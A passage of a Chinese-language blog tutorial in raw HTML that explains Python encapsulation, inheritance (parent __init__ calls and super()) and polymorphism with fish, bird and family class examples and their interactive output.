封装</h3>\n<p>封装是指将数据与具体操作的实现代码放在某个对象内部，使这些代码的实现细节不被外界发现，外界只能通过接口使用该对象，而不能通过任何形式修改对象内部实现，正是由于封装机制，程序在使用某一对象时不需要关心该对象的数据结构细节及实现操作的方法。使用封装能隐藏对象实现细节，使代码更易维护，同时因为不能直接调用、修改对象内部的私有信息，在一定程度上保证了系统安全性。类通过将函数和变量封装在内部，实现了比函数更高一级的封装。</p>\n<h3 id=\"继承\"><a class=\"anchor\" href=\"#继承\">#</a> 继承</h3>\n<p>继承来源于现实世界，一个最简单的例子就是孩子会具有父母的一些特征，即每个孩子都会继承父亲或者母亲的某些特征，当然这只是最基本的继承关系，现实世界中还存在着更复杂的继承。继承机制实现了代码的复用，多个类公用的代码部分可以只在一个类中提供，而其他类只需要继承这个类即可。</p>\n<p>在 OOP 程序设计中，当我们定义一个新类的时候，新的类称为子类（Subclass），而被继承的类称为基类、父类或超类（Base class、Super class）。继承最大的好处是子类获得了父类的全部变量和方法的同时，又可以根据需要进行修改、拓展。<br />\nPython 支持多父类的继承机制，所以需要注意圆括号中基类的顺序，若是基类中有相同的方法名，并且在子类使用时未指定，Python 会从左至右搜索基类中是否包含该方法。一旦查找到则直接调用，后面不再继续查找。</p>\n<p>需要注意的是，如果子类中定义域父类同名的方法或属性，则会自动覆盖父亲对应的方法或属性</p>\n<p>继承实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Fish</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">move</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"游动了一会，现在的位置是%d\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Salmon</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Goldfish</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">### 上面都是普通鱼，下面定义一个吃货鱼，除了继承 Fish 类的属性和方法，再给它定义一个吃的方法</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"吃鱼咯\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"饱了不饿\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">############### 测试输出</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish <span class=\"token operator\">=</span> Fish<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> goldfish <span class=\"token operator\">=</span> Goldfish<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> goldfish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>吃鱼咯</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>饱了不饿</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>饱了不饿</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#26>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  File <span class=\"token string\">\"C:/Users/14268/Desktop/1.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> move</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'Shark'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'x'</span></pre></td></tr></table></figure><p>同样是继承 Fish () 类，金鱼却可以移动，为什么鲨鱼不行呢？其实这里的报错说的已经很清楚了：Shark 类中没有 x 属性。<br />\n这是因为重写了魔法方法__init__, 但新的__init__方法里没有初始化鲨鱼的 x 坐标，因此调用 move 方法就会报错。<br />\n所以应该在鲨鱼类中重写__init__方法的时候先调用基类 Fish 的__init__方法。有两种实现方法：</p>\n<ul>\n<li>调用未绑定的父类方法</li>\n<li>使用 super 函数</li>\n</ul>\n<h4 id=\"调用未绑定的父类方法\"><a class=\"anchor\" href=\"#调用未绑定的父类方法\">#</a> 调用未绑定的父类方法</h4>\n<p>代码如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Fish<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">##### 测试输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr></table></figure><p>发现鲨鱼可以移动了。</p>\n<p>这里需要注意的是这个 self 并不是父类 Fish 的实例对象，而是子类 Shark 的实例对象，所以这里说的未绑定是指不需要绑定父类的实例对象，使用子类的实例对象代替即可。</p>\n<p>这是小甲鱼的书上的介绍。</p>\n<p>个人理解是：在 Shark 类的__init__函数里调用了父类的__init__函数，并把父类的__init__函数里的要赋值属性赋值给了子类的 self。也就是普通的调用函数一样，传入了个参数是 self。</p>\n<h4 id=\"super函数\"><a class=\"anchor\" href=\"#super函数\">#</a> super 函数</h4>\n<p>如果觉得调用未绑定的父类方法难以理解，Python 中还有一个更好的方法可以取代它。那就是使用 super 函数</p>\n<p>上面的代码可以这样改：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#### 测试输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以移动。</p>\n<p>super 函数的 &quot;超级&quot; 之处在于既不需要明确给出任何基类的名字，它会自动帮您找出所有基类以及对应的方法。</p>\n<p>由于你不用给出基类的名字，这就意味着如果需要改变类继承关系，只要改变 calss 语句里的父类即可，而不必邀在大量的代码中去修改被继承的方法。</p>\n<p>还有多重继承、组合、以及一种很流行的编程模式：Minxin 等。</p>\n<h3 id=\"多态\"><a class=\"anchor\" href=\"#多态\">#</a> 多态</h3>\n<p>转载自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY5NTk2OS9hcnRpY2xlL2RldGFpbHMvOTIxNzU4NDA=\">https://blog.csdn.net/weixin_44695969/article/details/92175840</span></p>\n<p>Python 中多态的作用<br />\n让具有不同功能的函数可以使用相同的函数名，这样就可以用一个函数名调用不同内容 (功能) 的函数。</p>\n<p>Python 中多态的特点<br />\n 1、只关心对象的实例方法是否同名，不关心对象所属的类型；<br />\n2、对象所属的类之间，继承关系可有可无；<br />\n3、多态的好处可以增加代码的外部调用灵活度，让代码更加通用，兼容性比较强；<br />\n4、多态是调用方法的技巧，不会影响到类的内部设计。</p>\n<p>多态的应用场景</p>\n<ol>\n<li>对象所属的类之间没有继承关系<br />\n调用同一个函数 fly (), 传入不同的参数（对象），可以达成不同的功能</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Duck</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                  <span class=\"token comment\"># 鸭子类</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"鸭子沿着地面飞起来了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Swan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                  <span class=\"token comment\"># 天鹅类</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"天鹅在空中翱翔\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Plane</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                 <span class=\"token comment\"># 飞机类</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"飞机隆隆地起飞了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                        <span class=\"token comment\"># 实现飞的功能函数</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>fly<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>duck <span class=\"token operator\">=</span> Duck<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>fly<span class=\"token punctuation\">(</span>duck<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>swan <span class=\"token operator\">=</span> Swan<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>fly<span class=\"token punctuation\">(</span>swan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>plane <span class=\"token operator\">=</span> Plane<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>fly<span class=\"token punctuation\">(</span>plane<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">=</span>运行结果：<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>鸭子沿着地面飞起来了</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>天鹅在空中翱翔</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>飞机隆隆地起飞了</pre></td></tr></table></figure><ol start=\"2\">\n<li>对象所属的类之间有继承关系（应用更广）</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">gradapa</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>money<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>money <span class=\"token operator\">=</span> money</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is gradapa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">father</span><span class=\"token punctuation\">(</span>gradapa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>money<span class=\"token punctuation\">,</span>job<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>money<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        self<span class=\"token punctuation\">.</span>job <span class=\"token operator\">=</span> job</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is father,我重写了父类的方法\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">mother</span><span class=\"token punctuation\">(</span>gradapa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> money<span class=\"token punctuation\">,</span> job<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>money<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        self<span class=\"token punctuation\">.</span>job <span class=\"token operator\">=</span> job</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>         <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is mother,我重写了父类的方法\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>         <span class=\"token keyword\">return</span> <span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>         </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#定义一个函数，函数调用类中的 p () 方法</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fc</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gradapa1 <span class=\"token operator\">=</span> gradapa<span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>father1 <span class=\"token operator\">=</span> father<span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"工人\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mother1 <span class=\"token operator\">=</span> mother<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"老师\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>fc<span class=\"token punctuation\">(</span>gradapa1<span class=\"token punctuation\">)</span>            <span class=\"token comment\">#这里的多态性体现是向同一个函数，传递不同参数后，可以实现不同功能.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>fc<span class=\"token punctuation\">(</span>father1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fc<span class=\"token punctuation\">(</span>mother1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">=</span>运行结果：<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token 